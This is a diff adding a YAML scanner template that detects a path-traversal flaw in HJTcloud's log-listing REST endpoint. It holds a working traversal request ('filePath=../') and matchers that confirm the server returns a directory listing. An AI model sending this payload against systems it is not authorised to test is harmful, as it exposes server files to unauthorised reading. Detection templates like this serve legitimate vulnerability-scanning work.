@@ -1,0 +1,36 @@
+id: "hjtcloud-rest-arbitrary-file-read"
+name: "HJTcloud - Local File Inclusion"
+severity: "high"
+description: "HJTcloud is vulnerable to local file inclusion."
+tech:
+  - "generic"
+tags:
+  - "hjtcloud"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/him/api/rest/V1.0/system/log/list?filePath=../"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "\"name\":"
+      - "\"length\":"
+      - "\"filePath\":"
+      - "\"list\":"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "application/json"
+  - type: "status"
+    status:
+      - 200
